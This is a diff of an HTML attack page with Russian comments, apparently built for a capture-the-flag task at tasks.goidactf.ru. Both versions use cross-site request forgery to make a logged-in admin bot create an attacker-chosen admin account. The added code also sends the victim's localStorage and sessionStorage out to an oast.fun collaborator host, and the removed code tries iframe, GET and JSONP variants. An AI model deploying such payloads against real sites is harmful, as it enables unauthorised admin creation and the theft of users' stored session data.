@@ -1,108 +1,36 @@
 <!DOCTYPE html>
-<html>
-<body>
+<form method="POST" action="https://tasks.goidactf.ru:20395/create_admin" target="_blank">
+    <input type="hidden" name="new_admin_login" value="HACKED_BY_BOT">
+</form>
 <script>
-const TARGET = 'https://tasks.goidactf.ru:20395';
-const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
-const ADMIN_NAME = 'PWNED_' + Math.random().toString(36).substr(2, 10);
+// Форма отправит куки автоматически
+document.forms[0].submit();
 
-// Функция для отправки сигналов
-function signal(msg) {
-    new Image().src = `${COLLAB}/?${msg}&t=${Date.now()}`;
-}
-
-signal('start');
-
-// === МЕТОД 1: Form POST (самый надёжный) ===
-const form = document.createElement('form');
-form.method = 'POST';
-form.action = `${TARGET}/create_admin`;
-form.target = '_blank'; // открыть в новой вкладке
-form.innerHTML = `
-    <input type="hidden" name="new_admin_login" value="${ADMIN_NAME}">
-    <input type="hidden" name="redirect" value="${COLLAB}/callback?admin=${ADMIN_NAME}">
-    <input type="hidden" name="callback" value="${COLLAB}/jsonp?admin=${ADMIN_NAME}">
-`;
-document.body.appendChild(form);
-form.submit();
-signal('form_submitted');
-
-// === МЕТОД 2: iframe с формой ===
+// Пробуем также через fetch с credentials
 setTimeout(() => {
-    const iframe = document.createElement('iframe');
-    iframe.name = 'hiddenFrame';
-    iframe.style.display = 'none';
-    
-    const iframeForm = document.createElement('form');
-    iframeForm.method = 'POST';
-    iframeForm.action = `${TARGET}/create_admin`;
-    iframeForm.target = 'hiddenFrame';
-    iframeForm.innerHTML = `<input name="new_admin_login" value="${ADMIN_NAME}_IFRAME">`;
-    
-    iframe.onload = () => {
-        signal('iframe_loaded');
-        try {
-            // Пробуем прочитать iframe (может не сработать из-за CORS)
-            const content = iframe.contentDocument.body.innerText || iframe.contentDocument.body.textContent;
-            if (content) signal('iframe_content=' + encodeURIComponent(content.substring(0, 100)));
-        } catch(e) {
-            signal('iframe_blocked_by_cors');
-        }
-    };
-    
-    document.body.appendChild(iframe);
-    document.body.appendChild(iframeForm);
-    iframeForm.submit();
-}, 1000);
+    fetch('https://tasks.goidactf.ru:20395/create_admin', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        credentials: 'include', // Отправляет куки сессии
+        mode: 'no-cors', // Чтобы избежать CORS ошибок при отправке
+        body: 'new_admin_login=FETCH_ADMIN'
+    });
+}, 500);
 
-// === МЕТОД 3: Пробуем GET запросы (если endpoint принимает GET) ===
+// Проверяем, какие куки вообще есть
 setTimeout(() => {
-    // Пробуем GET версию
-    new Image().src = `${TARGET}/create_admin?new_admin_login=${ADMIN_NAME}_GET`;
-    signal('get_attempt');
+    // Отправляем сигнал о том что скрипт выполнился
+    new Image().src = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?script_executed=yes';
     
-    // Пробуем JSONP
-    const script = document.createElement('script');
-    script.src = `${TARGET}/create_admin?callback=handleResponse&new_admin_login=${ADMIN_NAME}_JSONP`;
-    document.body.appendChild(script);
+    // Пробуем прочитать localStorage/sessionStorage на всякий случай
+    try {
+        const ls = JSON.stringify(localStorage);
+        new Image().src = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?localStorage=' + encodeURIComponent(ls.substring(0, 1000));
+    } catch(e) {}
     
-    window.handleResponse = function(data) {
-        signal('jsonp_success=' + encodeURIComponent(JSON.stringify(data)));
-    };
+    try {
+        const ss = JSON.stringify(sessionStorage);
+        new Image().src = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?sessionStorage=' + encodeURIComponent(ss.substring(0, 1000));
+    } catch(e) {}
 }, 2000);
-
-// === МЕТОД 4: Косвенная проверка через 5 секунд ===
-setTimeout(() => {
-    // Пробуем получить доступ к админке
-    fetch(`${TARGET}/admin`, {
-        credentials: 'include',
-        mode: 'no-cors'
-    }).then(() => {
-        signal('admin_page_accessible');
-    }).catch(() => {
-        signal('admin_page_blocked');
-    });
-    
-    // Пробуем загрузить специфичный файл
-    const testResources = [
-        '/api/admins',
-        '/list_admins', 
-        '/users',
-        `/api/check_admin?name=${ADMIN_NAME}`,
-        `/admin/check?user=${ADMIN_NAME}`
-    ];
-    
-    testResources.forEach((resource, i) => {
-        setTimeout(() => {
-            const img = new Image();
-            img.onload = () => signal(`resource_${i}_loaded=${resource}`);
-            img.onerror = () => signal(`resource_${i}_error=${resource}`);
-            img.src = TARGET + resource;
-        }, i * 500);
-    });
-}, 5000);
-
-signal('init_complete');
 </script>
-</body>
-</html>
